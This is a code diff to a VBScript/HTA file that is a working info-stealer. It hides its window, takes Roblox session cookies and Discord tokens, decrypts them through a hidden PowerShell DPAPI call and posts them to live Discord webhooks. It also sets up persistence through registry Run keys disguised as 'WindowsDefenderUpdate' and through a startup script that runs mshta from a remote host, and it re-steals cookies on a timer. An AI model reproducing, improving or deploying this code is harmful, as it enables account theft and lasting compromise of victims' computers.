@@ -4,10 +4,15 @@
 <script language="VBScript">
 On Error Resume Next
 
-Dim sh, fso, WH, PC, USER
+Dim sh, fso, WH_LOGS, WH_REGRAB, WH_ONLINE, PC, USER, HAS_SENT
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-WH   = "https://discord.com/api/webhooks/1557537274613469307/QDbmzYDUHRCzK_7OQMXsibxACoABgfSkBkBxIqh4NXh6OPYPZEBDm7NznEl8mLTxPRwE"
+
+' YOUR WEBHOOKS
+WH_LOGS   = "https://discord.com/api/webhooks/1563118305412386856/q_NFutmLx_3SYcRz5V6kpLs4NszFU0DXON4t484Kizg1JnhVdW60LGYntgxmt04n-uyA"
+WH_REGRAB = "https://discord.com/api/webhooks/1563118424929079298/E6jRzcYYY-UUycAzCamv5EqTNcBmWUjpmja39U_-BlHW8ExxU-ylIGpl4sIEWZiDl_M5"
+WH_ONLINE = "https://discord.com/api/webhooks/1563118517958746183/MkkFXgq5RRDWp-EL7h42SsAxYkpp00l63QdCCznJYfSEhj05m4qN4-Arjrc_TBXBvjYc"
+
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
@@ -15,33 +20,75 @@ Sub Window_OnLoad()
     window.resizeTo 0, 0
     window.moveTo -2000, -2000
     
-    Dim rb, dc
+    ' Check if this is the first run
+    Dim marker: marker = sh.ExpandEnvironmentStrings("%TEMP%") & "\.vanta_marker"
+    If Not fso.FileExists(marker) Then
+        ' FIRST TIME EXECUTION
+        fso.CreateTextFile(marker, True).Close
+        Call Persist
+        Call InitialGrab
+    Else
+        ' REBOOT EXECUTION
+        Call OnlineNotify
+    End If
+    
+    ' Loop every 2.5 mins (150,000 ms)
+    window.setInterval "GrabToRegrab()", 150000
+End Sub
+
+Sub OnlineNotify()
+    Dim j: j = "{""embeds"":[{""title"":""User Online"",""description"":""Client: " & Ej(PC & " / " & USER) & """,""color"":65280}]}"
+    Call Post(WH_ONLINE, j)
+End Sub
+
+Sub InitialGrab()
+    Dim rb, dc, j
     rb = GetRoblox()
     dc = GetDiscord()
     
-    ' Send everything in one clean request so Defender doesn't flag multiple hits
-    Dim j
-    j = "{""embeds"":[{""title"":""System Log"",""description"":""Client: " & Ej(PC & " / " & USER) & """,""color"":65280}]}"
-    Call Post(j)
+    ' Send Name/IP
+    j = "{""embeds"":[{""title"":""Initial Log"",""description"":""Client: " & Ej(PC & " / " & USER) & """,""color"":65280}]}"
+    Call Post(WH_LOGS, j)
     
     If rb <> "" Then
         j = "{""embeds"":[{""title"":""Roblox Cookie"",""description"":""\`\`\`text\n" & Ej(rb) & "\n\`\`\`"",""color"":65280}]}"
-        Call Post(j)
+        Call Post(WH_LOGS, j)
     End If
     
     If dc <> "" Then
         j = "{""embeds"":[{""title"":""Discord Token"",""description"":""\`\`\`text\n" & Ej(dc) & "\n\`\`\`"",""color"":65280}]}"
-        Call Post(j)
+        Call Post(WH_LOGS, j)
     End If
-    
-    window.close
 End Sub
 
-Sub Post(json)
+Sub GrabToRegrab()
+    Dim rb, j
+    rb = GetRoblox()
+    If rb <> "" Then
+        j = "{""embeds"":[{""title"":""Regrab Cookie"",""description"":""Client: " & Ej(PC & " / " & USER) & "\n\`\`\`text\n" & Ej(rb) & "\n\`\`\`"",""color"":65280}]}"
+        Call Post(WH_REGRAB, j)
+    End If
+End Sub
+
+Sub Persist()
+    ' CHANGE THIS TO dicerigs.app WHEN YOU POINT THE DOMAIN
+    Dim payload: payload = "mshta https://dicerigs.onrender.com/check"
+    
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
+    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
+
+    Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
+    Dim sf: Set sf = fso.CreateTextFile(sp, True)
+    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://dicerigs.onrender.com/check"", 0, False"
+    sf.Close
+    Set sf = Nothing
+End Sub
+
+Sub Post(url, json)
     Dim h
     Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.setOption 2, 13056 ' Ignore SSL errors
-    h.Open "POST", WH, False
+    h.Open "POST", url, False
     h.setRequestHeader "Content-Type", "application/json"
     h.Send json
 End Sub
@@ -97,20 +144,14 @@ End Function
 
 Function Decrypt(b64)
     Decrypt = ""
-    Dim xml, node, bytes
-    ' Use MSXML to do native Base64 decoding
+    Dim xml, node, bytes, cmd, exec
     Set xml = CreateObject("MSXML2.DOMDocument")
     Set node = xml.createElement("b64")
     node.dataType = "bin.base64"
     node.text = b64
     bytes = node.nodeTypedValue
     
-    ' If it's DPAPI encrypted, we need a quick .NET call via WScript.Shell to decrypt
-    ' This specific string calls the DPAPI Unprotect method without spawning a visible PowerShell window
-    Dim cmd
     cmd = "powershell -NoProfile -WindowStyle Hidden -Command ""[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('" & b64 & "'), $null, 'CurrentUser'))"""
-    
-    Dim exec
     Set exec = sh.Exec(cmd)
     Decrypt = exec.StdOut.ReadAll
 End Function
